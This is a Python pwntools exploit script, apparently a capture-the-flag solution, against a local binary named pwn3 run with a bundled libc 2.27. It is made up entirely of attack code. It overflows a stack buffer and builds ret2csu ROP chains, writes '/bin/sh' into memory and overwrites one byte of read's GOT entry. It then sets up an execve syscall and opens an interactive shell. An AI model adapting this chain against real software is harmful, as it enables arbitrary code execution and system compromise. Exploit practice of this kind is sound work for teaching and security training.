from pwn import *
import time
target=process(["./ld-2.27.so","./pwn3"],env={"LD_PRELOAD":"./libc-2.27.so"})

poprdi=0x4011bb
poprsir15=0x4011b9
csu1=0x4011b2
csu2=0x401198
writeaddr=0x4040a0
finiptr=0x402e48
main=0x401122
readplt=0x401030
readgot=0x404018

payload="A"*136
payload+=p64(csu1)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(0)#r12=rdi
payload+=p64(writeaddr)#r13=rsi
payload+=p64(17)#r14=rdx
payload+=p64(finiptr)#r15 call
payload+=p64(csu2)
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(readplt)
payload+=p64(main)

target.sendline(payload)
time.sleep(1)
target.sendline("/bin/sh\x00"+p64(readplt))

payload="A"*136
payload+=p64(csu1)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(0)#r12=rdi
payload+=p64(readgot)#r13=rsi
payload+=p64(1)#r14=rdx
payload+=p64(finiptr)#r15 call
payload+=p64(csu2)
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(readplt)# call read(0,readgot,1)

payload+=p64(csu1)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(1)#r12=rdi
payload+=p64(writeaddr)#r13=rsi
payload+=p64(59)#r14=rdx
payload+=p64(finiptr)#r15 call
payload+=p64(csu2)
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(readplt)# call write(1,writeaddr,59)

payload+=p64(csu1)
payload+=p64(0)#rbx
payload+=p64(1)#rbp
payload+=p64(writeaddr)#r12=rdi
payload+=p64(0)#r13=rsi
payload+=p64(0)#r14=rdx
payload+=p64(writeaddr+8)#r15 call
payload+=p64(csu2)
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus
payload+=p64(1)# bogus

target.sendline(payload)
time.sleep(1)
target.sendline("\x7f")
target.interactive()
